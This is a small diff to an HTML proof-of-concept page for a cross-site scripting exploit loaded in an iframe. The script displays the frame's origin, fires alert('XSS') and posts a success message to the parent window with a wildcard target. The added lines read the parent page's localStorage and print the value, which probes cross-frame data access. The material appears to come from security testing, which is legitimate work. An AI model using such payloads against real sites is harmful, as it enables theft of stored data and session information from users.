@@ -7,8 +7,10 @@
 <body style="background:#000;color:#fff;font-family:monospace;">
   <h1>🔥 PoC iframe exploit loaded</h1>
   <p>Domain: <code id="d"></code></p>
+  <p>Parent Local Storage: <code id="l"></code></p>
   <script>
     document.getElementById('d').textContent = location.origin;
+    document.getElementById('l').textContent = window.parent.localStorage.test
     alert('XSS');
     window.parent.postMessage("XSS_SUCCESS|" + location.origin, "*");
 
